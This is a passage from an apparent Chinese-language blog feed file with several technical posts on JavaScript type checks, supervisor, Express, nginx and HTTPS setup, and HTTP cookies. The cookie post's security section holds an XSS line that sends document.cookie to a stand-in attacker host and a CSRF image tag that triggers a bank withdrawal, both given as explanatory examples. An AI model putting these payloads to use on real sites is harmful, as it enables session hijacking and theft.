来获取每个对象的类型。为了每个对象都能通过 <code>Object.prototype.toString()</code> （避免出现 null.toString() 和 undefined.toString() 的情况）来检测，需要以 <code>Function.prototype.call()</code> 或者 <code>Function.prototype.apply()</code> 的形式来调用，传递要检查的对象作为第一个参数，称为<code>thisArg</code>。</p><blockquote><p>Object.prototype.toString.call(v);</p></blockquote><table><thead><tr><th>类型</th><th>toString</th></tr></thead><tbody><tr><td>Undefined</td><td>[object Undefined]</td></tr><tr><td>Null</td><td>[object Null]</td></tr><tr><td>Boolean</td><td>[object Boolean]</td></tr><tr><td>Number</td><td>[object Number]</td></tr><tr><td>String</td><td>[object String]</td></tr><tr><td>Symbol</td><td>[object Symbol]</td></tr><tr><td>Object</td><td>[object Object]</td></tr><tr><td>-</td><td>-</td></tr><tr><td>Function</td><td>[object Function]</td></tr><tr><td>Array</td><td>[object Array]</td></tr><tr><td>Date</td><td>[object Date]</td></tr><tr><td>RegExp</td><td>[object RegExp]</td></tr></tbody></table><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/typeof">typeof</a> </li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/instanceof">instanceof</a> </li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/toString">Object.prototype.toString()</a></li><li><a href="http://www.nowamagic.net/librarys/veda/detail/1642">JavaScript探秘：构造函数 Constructor</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> typeof </tag>
            
            <tag> instanceof </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>supervisor.md</title>
      <link href="/post/supervisor.html"/>
      <url>/post/supervisor.html</url>
      
        <content type="html"><![CDATA[<h3 id="supervisor"><a href="#supervisor" class="headerlink" title="supervisor"></a>supervisor</h3><p>supervisor就是用Python开发的一套通用的进程管理程序，能将一个普通的命令行进程变为后台daemon，并监控进程状态，异常退出时能自动重启。</p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install supervisor</span><br></pre></td></tr></table></figure><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>生成配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo_supervisord_conf &gt; /etc/supervisor/supervisord.conf</span><br></pre></td></tr></table></figure><blockquote><p>修改 supervisord.conf的文件[include]配置，可以用来指包含所有的配置文件[include] files &#x3D; &#x2F;etc&#x2F;supervisor&#x2F;conf.d&#x2F;* .conf</p></blockquote><p>启动supervisord</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisord -c /etc/supervisor/supervisord.conf</span><br></pre></td></tr></table></figure><p>program 配置 在<code>/etc/supervisor/</code>目录下新建一个文件<a href="http://www.conf/">www.conf</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[program:express]</span><br><span class="line">directory = /home/node/projects/express ; 项目目录启动目录</span><br><span class="line">command = node bin/www  ; 启动命令，可以看出与手动在命令行启动的命令是一样的</span><br><span class="line">autostart = true     ; 在 supervisord 启动的时候也自动启动</span><br><span class="line">startsecs = 5        ; 启动 5 秒后没有异常退出，就当作已经正常启动了</span><br><span class="line">autorestart = true   ; 程序异常退出后自动重启</span><br><span class="line">startretries = 5     ; 启动失败自动重试次数，默认是 3</span><br><span class="line">user = node          ; 用哪个用户启动</span><br><span class="line">redirect_stderr = true  ; 把 stderr 重定向到 stdout，默认 false</span><br><span class="line">stdout_logfile_maxbytes = 100MB  ; stdout 日志文件大小，默认 50MB</span><br><span class="line">stdout_logfile_backups = 20     ; stdout 日志文件备份数</span><br><span class="line">; stdout 日志文件，需要注意当指定目录不存在时无法正常启动，所以需要手动创建目录（supervisord 会自动创建日志文件）</span><br><span class="line">stdout_logfile = /var/log/express_stdout.log</span><br><span class="line">environment=NODE_ENV=production</span><br></pre></td></tr></table></figure><p>使用 supervisorctl  </p><blockquote><p>Supervisorctl 是 supervisord 的一个命令行客户端工具，启动时需要指定与 supervisord 使用同一份配置文件</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl -c /etc/supervisor/supervisord.conf</span><br></pre></td></tr></table></figure><p>启动后会进入一个交互环境  </p><ul><li>status ; 获得所有程序状态  </li><li>stop express; 停止express这个项目  </li><li>start express; 启动express这个项目  </li><li>shutdown ; 关闭所有项目  </li><li>reread ; 读取有更新（增加）的配置文件，不会启动新添加的程序* update ; 重启配置文件修改过的程序</li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.ttlsa.com/linux/using-supervisor-control-program/">【1】</a> <a href="http://www.liaoxuefeng.com/article/0013738926914703df5e93589a14c19807f0e285194fe84000">【2】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>express-view.md</title>
      <link href="/post/express-view.html"/>
      <url>/post/express-view.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));</span><br><span class="line">// 注册模板引擎</span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;html&#x27;);</span><br><span class="line">// 注册模板引擎实现</span><br><span class="line">app.engine(&#x27;html&#x27;, ejs.renderFile);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> express </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP Cookies</title>
      <link href="/post/cookie.html"/>
      <url>/post/cookie.html</url>
      
        <content type="html"><![CDATA[<h2 id="HTTP-Cookies"><a href="#HTTP-Cookies" class="headerlink" title="HTTP Cookies"></a>HTTP Cookies</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>HTTP Cookie（也叫Web cookie或者浏览器Cookie）是服务器发送到用户浏览器并保存在浏览器上的一块数据，它会在浏览器下一次发起请求时被携带并发送到服务器上。</p><h3 id="创建-Cookie"><a href="#创建-Cookie" class="headerlink" title="创建 Cookie"></a>创建 Cookie</h3><p>服务器使用Set-Cookie响应头部向用户代理（一般指浏览器）发送Cookie信息。一个简单的Cookie可能像这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: &lt;cookie名称&gt;=&lt;cookie值&gt;</span><br></pre></td></tr></table></figure><p>设置完 Cookie 后对该服务器发起的每一次新的请求，浏览器都会将之前保存的Cookie信息通过Cookie请求头发送给服务器。</p><h4 id="会话期Cookie"><a href="#会话期Cookie" class="headerlink" title="会话期Cookie"></a>会话期Cookie</h4><p>会话期 Cookie 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是它仅在会话期间有效。会话期 Cookie <em>不需要指定过期时间（Expires）或者有效期（Max-Age）</em> 。需注意的是，有些浏览器提供了会话恢复的功能，这种情况下即便关闭了浏览器会话期 Cookie 也会被保存，就好像浏览器从来没有关闭一样。</p><h4 id="持久Cookie"><a href="#持久Cookie" class="headerlink" title="持久Cookie"></a>持久Cookie</h4><p>和关闭浏览器便失效不同，持久Cookie可以指定一个特定的过期时间（Expires）或者有效期（Max-Age）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</span><br></pre></td></tr></table></figure><h4 id="安全和HttpOnly类型Cookie"><a href="#安全和HttpOnly类型Cookie" class="headerlink" title="安全和HttpOnly类型Cookie"></a>安全和HttpOnly类型Cookie</h4><p>只有在使用 SLL 和 HTTPS 协议向服务器发起请求时，才能确保 Cookie 被安全地发送到服务器。HttpOnly 标志并没有给你提供额外的加密或者安全性上的能力，当整个机器暴露在不安全的环境时，切记绝不能通过 HTTP Cookie 存储、传输机密或者敏感信息。</p><p>HTTP-only 类型的 Cookie 不能使用 Javascript 通过 <code>Document.cookie</code> 属性来访问，从而能够在一定程度上阻止域脚本攻击（XSS）。当你不需要在 JavaScript 代码中访问你的 Cookie 时，可以将该 Cookie 设置成 HttpOnly 类型。特别的，当你的 Cookie 仅仅是用于定义会话的情况下，最好给它设置一下 HttpOnly 标志。</p><p>只有当一个请求通过 SSL 或 HTTPS 创建时，包含 Secure 选项的 cookie 才能被发送至服务器。这种 Cookie 的内容具有很高的价值，如果以纯文本形式传递很有可能被篡改。事实上，机密且敏感的信息绝不应该在 Cookie 中存储或传输，因为 Cookie 的整个机制原本都是不安全的。默认情况下，在 HTTPS 链接上传输的 Cookie 都会被自动添加上 Secure 选项。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</span><br></pre></td></tr></table></figure><h4 id="Cookie的作用域"><a href="#Cookie的作用域" class="headerlink" title="Cookie的作用域"></a>Cookie的作用域</h4><p>Domain 和 Path 指令定义了 Cookie 的作用域，即需要发送 Cookie 的 URL 集合。</p><p>Domain 指令规定了需要发送 Cookie 的主机名。如果没有指定，默认为当前的文档地址上的主机名（但是不包含子域名）。如果指定了 Domain，则一般包含子域名。</p><p>如果设置了 Domain&#x3D;mozilla.org ，则 Cookie 包含在子域名中（如developer.mozilla.org）。不能跨域上设置一个 Cookie，因为这会产生安全问题。不合法的 Domain 选择将直接被忽略。</p><p>Path 指令表明需要发送 Cookie 的URL路径。字符%x2F (即”&#x2F;“)用做文件夹分隔符，子文件夹也会被匹配到。</p><p>如设置Path&#x3D;&#x2F;docs，则下面这些地址都将匹配到:</p><p>“&#x2F;docs”,<br>“&#x2F;docs&#x2F;Web&#x2F;“,<br>“&#x2F;docs&#x2F;Web&#x2F;HTTP”</p><h3 id="清理-Cookie"><a href="#清理-Cookie" class="headerlink" title="清理 Cookie&#96;"></a>清理 Cookie&#96;</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: &lt;cookie名称&gt;=; path=&lt;Path&gt;; expires=Thu, 01 Jan 1970 00:00:00 GMT</span><br></pre></td></tr></table></figure><h3 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h3><h4 id="会话劫持和XSS"><a href="#会话劫持和XSS" class="headerlink" title="会话劫持和XSS"></a>会话劫持和XSS</h4><p>在Web应用中，Cookie 常常用来标记用户和会话授权。因此，如果窃取了 Web 应用的 Cookie，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学进行攻击和利用应用程序的漏洞进行XSS攻击。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> <span class="title class_">Image</span>()).<span class="property">src</span> = <span class="string">&quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br></pre></td></tr></table></figure><p>HttpOnly 类型的 Cookie 由于阻止了 JavaScript 对 Cookie 进行访问而能在一定程度上缓解此类攻击。</p><h4 id="跨站请求伪造（CSRF）"><a href="#跨站请求伪造（CSRF）" class="headerlink" title="跨站请求伪造（CSRF）"></a>跨站请求伪造（CSRF）</h4><p>维基百科已经给了一个比较好的 CSRF 例子。在这个情况下，有一张并不真实存在的图片（可能是在不安全聊天室或论坛），它实际上是向你的银行服务器发送了提现请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;&gt;</span><br></pre></td></tr></table></figure><p>当你打开含有了这张图片（<strong>本质上不存在这张图片，只是为了利用浏览器加载图片去发送请求。不是 Ajax 请求，浏览器不会因为跨域而拦截。</strong>）的HTML页面时，如果 <strong>你已经登录了你的银行帐号并且还有效</strong>（而且没有其它验证步骤），你的银行里的钱可能会被自动转走。</p><h3 id="Cookie-VS-Session"><a href="#Cookie-VS-Session" class="headerlink" title="Cookie VS Session"></a>Cookie VS Session</h3><p>Cookie 和 Session 本身没什么联系。Cookie 是放置到客户端的，Session 是放置在服务器端的。服务器端的 Session 其实就是一个 K-V 形式的键值对，Key 就是 SessionID。很多时候我们就把 SessionID 放置到 Cookie 中，利用 <strong>浏览器下一次发起请求时会携带 Cookie 并发送到服务器上</strong> 的便利来跟踪标识一个用户。服务器端从 Cookie 中拿到 SessionID，用 SessionID 拿到 Session 的信息。很多情况下我们会在浏览器地址栏见到类似<code>?jsessionid=xxxxx</code>的URL，这种情况就是把 SessionID 放置到 URL 中来携带，在客户端不支持 Cookie 的情况下使用。之所以我们一看到 Session 就会提到 Cookie 是因为 Cookie 携带 SessionID 十分便利罢了。</p><h3 id="注意事项及常见问题"><a href="#注意事项及常见问题" class="headerlink" title="注意事项及常见问题"></a>注意事项及常见问题</h3><h3 id="跨域携带-Cookie-问题"><a href="#跨域携带-Cookie-问题" class="headerlink" title="跨域携带 Cookie 问题"></a>跨域携带 Cookie 问题</h3><p>CORS 请求默认不发送 Cookie 和 HTTP 认证信息。如果要把 Cookie 发到服务器，一方面要服务器同意，指定 Access-Control-Allow-Credentials 字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure><p>另一方面，开发者必须在AJAX请求中打开withCredentials属性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var xhr = new XMLHttpRequest();</span><br><span class="line">xhr.withCredentials = true;</span><br></pre></td></tr></table></figure><p>否则，即使服务器同意发送 Cookie，浏览器也不会发送。或者，服务器要求设置 Cookie，浏览器也不会处理。<br>但是，如果省略 withCredentials 设置，有的浏览器还是会一起发送Cookie。这时，可以显式关闭 withCredentials。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.withCredentials = false;</span><br></pre></td></tr></table></figure><p>需要注意的是，如果要发送 Cookie，Access-Control-Allow-Origin 就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie依然遵循同源政策，只有用服务器域名设置的 Cookie 才会上传，其他域名的 Cookie 并不会上传，且（跨源）原网页代码中的 <code>document.cookie</code> 也无法读取服务器域名下的 Cookie。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies">HTTP cookies</a> </li><li><a href="http://bubkoo.com/2014/04/21/http-cookies-explained/">HTTP cookies 详解</a> </li><li><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html">CORS</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> cookie </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTPS</title>
      <link href="/post/https.html"/>
      <url>/post/https.html</url>
      
        <content type="html"><![CDATA[<h2 id="TODO-HTTPS"><a href="#TODO-HTTPS" class="headerlink" title="[TODO]HTTPS"></a>[TODO]HTTPS</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><img src="/images/QQ20160825-1@2x.jpg"></p><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><p><a href="https://mozilla.github.io/server-side-tls/ssl-config-generator/">https://mozilla.github.io/server-side-tls/ssl-config-generator/</a><br><a href="https://cipherli.st/">https://cipherli.st/</a><br><a href="https://weakdh.org/sysadmin.html">https://weakdh.org/sysadmin.html</a></p><h4 id="Nginx配置"><a href="#Nginx配置" class="headerlink" title="Nginx配置"></a>Nginx配置</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl;</span><br><span class="line">    <span class="attribute">server_name</span> YOUR_DOMAINNAME_HERE;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span>        /etc/ssl/kekek.cc/chained.pem;   // 公钥</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span>    /etc/ssl/kekek.cc/domain.key;// 私钥</span><br><span class="line">    <span class="attribute">ssl_session_timeout</span>    <span class="number">1d</span>;</span><br><span class="line">    <span class="attribute">ssl_session_cache</span>      shared:SSL:<span class="number">50m</span>;</span><br><span class="line">    <span class="attribute">ssl_session_tickets</span>    <span class="literal">off</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Node-js配置"><a href="#Node-js配置" class="headerlink" title="Node.js配置"></a>Node.js配置</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> server = http.<span class="title function_">createServer</span>(app);</span><br><span class="line"><span class="keyword">var</span> httpsServer = https.<span class="title function_">createServer</span>(&#123;</span><br><span class="line">    <span class="attr">key</span>: fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/etc/ssl/kekek.cc/domain.key&#x27;</span>),</span><br><span class="line">    <span class="attr">cert</span>: fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/etc/ssl/kekek.cc/chained.pem&#x27;</span>)</span><br><span class="line">&#125;, app);</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">80</span>);</span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, onError);</span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;listening&#x27;</span>, onListening);</span><br><span class="line"></span><br><span class="line">httpsServer.<span class="title function_">listen</span>(<span class="number">443</span>);</span><br><span class="line">httpsServer.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, onError);</span><br><span class="line">httpsServer.<span class="title function_">on</span>(<span class="string">&#x27;listening&#x27;</span>, onListening);</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://book.douban.com/subject/25863515/">图解HTTP 第七章</a></li><li><a href="https://zhuanlan.zhihu.com/p/22142170">深入揭秘HTTPS安全问题&amp;连接建立全过程</a></li><li><a href="https://blog.csdn.net/sean_cd/article/details/6966130">HTTPS工作原理</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> https </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript==中的类型转换</title>
      <link href="/post/javascript-equals.html"/>
      <url>/post/javascript-equals.html</url>
      
        <content type="html"><![CDATA[<h3 id="JavaScript-类型转换规则"><a href="#JavaScript-类型转换规则" class="headerlink" title="JavaScript &#x3D;&#x3D; 类型转换规则"></a>JavaScript &#x3D;&#x3D; 类型转换规则</h3><p>如果两个操作数类型不同，“&#x3D;&#x3D;”相等操作符也可能会认为它们相等。检测相等将会遵守如下规则和类型转换:</p><ul><li>如果一个值是 null ，另一个是 undefined ，则它们相等。</li><li>如果一个值是数字，另一个是字符串，先将字符串转换为数字，然后使用转换后的值进行比较。</li><li>如果其中一个值是 true ，则将其转换为 1 再进行比较。如果其中一个值是 false ，则将其转换为 0 再进行比较。</li><li>如果一个值是对象，另一个值是数字或字符串，则使用 3.8.3 节所提到的转换规则将对象转换为原始值，然后再进行比较。对象通过 toString() 方法或者 valueOf() 方法转换为原始值。 JavaScript 语言核心的内置类首先尝试使用 valueOf() ，再尝试使用 toString() ，除了日期类，日期类只使用 toString() 转换。那些不是 JavaScript 语言核心中的对象则通过各自的实现中定义的方法转换为原始值。</li><li>其他不同类型之间的比较均不相等。</li></ul><p>参考：《Javascript权威指南》4.9.1</p>]]></content>
      
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装nginx</title>
      <link href="/post/install-nginx.html"/>
      <url>/post/install-nginx.html</url>
      
        <content type="html"><![CDATA[<h2 id="源码安装"><a href="#源码安装" class="headerlink" title="源码安装"></a>源码安装</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>去<a href="http://nginx.org/en/download.html">download</a>页面选着合适的版本，下载源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://nginx.org/download/nginx-1.11.3.tar.gz</span><br><span class="line">tar -zxvf nginx-1.11.3.tar.gz</span><br></pre></td></tr></table></figure><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install gcc gcc-c++ make libtool zlib zlib-devel openssl openssl-devel pcre pcre-devel</span><br></pre></td></tr></table></figure><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><ol><li><p>configure</p><p> 编译的时候可以指定一些参数。nginx安装目录、配置文件路径、插件等等。<br> nginx大部分常用模块，编译时<code>./configure --help</code>以<code>--without</code>开头的都默认安装。<br> <code>--prefix=PATH</code>: 指定nginx的安装目录。默认 <code>/usr/local/nginx</code><br> <code>--conf-path=PATH</code>: 设置nginx.conf配置文件的路径。nginx允许使用不同的配置文件启动，通过命令行中的-c选项。默认为prefix&#x2F;conf&#x2F;nginx.conf<br> <code>--user=name</code>: 设置nginx工作进程的用户。安装完成后，可以随时在nginx.conf配置文件更改user指令。默认的用户名是nobody。–group&#x3D;name类似<br> <code>--with-pcre</code>: 设置PCRE库的源码路径，如果已通过yum方式安装，使用–with-pcre自动找到库文件。使用–with-pcre&#x3D;PATH时，需要从PCRE网站下载pcre库的源码（版本4.4 - 8.30）并解压，剩下的就交给Nginx的.&#x2F;configure和make来完成。perl正则表达式使用在location指令和 ngx_http_rewrite_module模块中<br> <code>--with-zlib=PATH</code>: 指定 zlib（版本1.1.3 - 1.2.5）的源码解压目录。在默认就启用的网络传输压缩模块ngx_http_gzip_module时需要使用zlib<br> <code>--with-http_ssl_module</code>: 使用https协议模块。默认情况下，该模块没有被构建。前提是openssl与openssl-devel已安装<br> <code>--with-http_stub_status_module</code>: 用来监控 Nginx 的当前状态<br> <code>--with-http_realip_module</code>: 通过这个模块允许我们改变客户端请求头中客户端IP地址值(例如X-Real-IP 或 X-Forwarded-For)，意义在于能够使得后台服务器记录原始客户端的IP地址<br> <code>--add-module=PATH</code>: 添加第三方外部模块，如nginx_upstream_check_module或缓存模块。每次添加新的模块都要重新编译（Tengine可以在新加入module时无需重新编译）<br> e.g,</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./configure \</span><br><span class="line">--user=nginx \</span><br><span class="line">--group=nginx \</span><br><span class="line">--add-module=./plugins/nginx_upstream_check_module/</span><br></pre></td></tr></table></figure></li><li><p>make</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp; make install</span><br></pre></td></tr></table></figure></li></ol><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ol><li><p>启动</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -c filename <span class="comment"># 默认 conf/nginx.conf</span></span><br></pre></td></tr></table></figure></li><li><p>停止</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nginx -s stop </span><br><span class="line"></span><br><span class="line"><span class="comment"># 平滑退出</span></span><br><span class="line"><span class="built_in">kill</span> -QUIT `<span class="built_in">cat</span> /var/run/nginx.pid`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 强制退出</span></span><br><span class="line"><span class="built_in">kill</span> -TERM `<span class="built_in">cat</span> /var/run/nginx.pid`</span><br></pre></td></tr></table></figure></li><li><p>平滑升级</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动新进程</span></span><br><span class="line"><span class="built_in">kill</span> -USR2 `<span class="built_in">cat</span> /var/run/nginx.pid`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逐步旧Server的停止工作进程</span></span><br><span class="line"><span class="built_in">kill</span> -WINCH `<span class="built_in">cat</span> /var/run/nginx.pid.oldbin`</span><br></pre></td></tr></table></figure></li><li><p>重新加载文件</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nginx -s relaod </span><br><span class="line"></span><br><span class="line"><span class="built_in">kill</span> -HUP `<span class="built_in">cat</span> /var/run/nginx.pid`</span><br></pre></td></tr></table></figure></li><li><p>检验配置文件</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -t -c /usr/local/nginx/conf/nginx.conf </span><br></pre></td></tr></table></figure></li><li><p>日志切割</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> -USR1 `<span class="built_in">cat</span> /nginx/logs/nginx.pid`</span><br></pre></td></tr></table></figure></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://segmentfault.com/a/1190000002797601">Nginx服务器安装及配置文件详解</a></li><li><a href="http://nginx.org/en/docs/control.html">Controlling nginx</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx常用模块</title>
      <link href="/post/nginx-modules.html"/>
      <url>/post/nginx-modules.html</url>
      
        <content type="html"><![CDATA[<h3 id="NGX-HTTP-AUTH-BASIC-MODULE"><a href="#NGX-HTTP-AUTH-BASIC-MODULE" class="headerlink" title="NGX_HTTP_AUTH_BASIC_MODULE"></a>NGX_HTTP_AUTH_BASIC_MODULE</h3><p>这个模块用来做Basic Auth认证的，默认就已经安装过了。</p><p>生成密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf &quot;username:$(openssl passwd -crypt password)\n&quot; &gt;&gt; conf/htpasswd</span><br></pre></td></tr></table></figure><p>修改配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name elk.kekek.cc;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">         auth_basic            &quot;elk.my-guide.cc&quot;;</span><br><span class="line">         auth_basic_user_file  htpasswd;</span><br><span class="line">         proxy_pass            http://elk.my-guide.cc:5601;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>需要注意的是如果<code>auth_basic_user_file</code>使用相对路径来指定，那么它相对的是conf文件。</p></blockquote><p>重新加载配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure><h3 id="NGX-HTTP-SUB-MODULE"><a href="#NGX-HTTP-SUB-MODULE" class="headerlink" title="NGX_HTTP_SUB_MODULE"></a>NGX_HTTP_SUB_MODULE</h3><p>这个模块可以让我们来修改网站响应内容中。</p><p>默认这个模块是没编译到Nginx中的，在配置的时候我们加上<code>--with-http_sub_module</code>就可以了。</p><p>它主要有三个指令</p><ul><li>sub_filter  <figure class="highlight 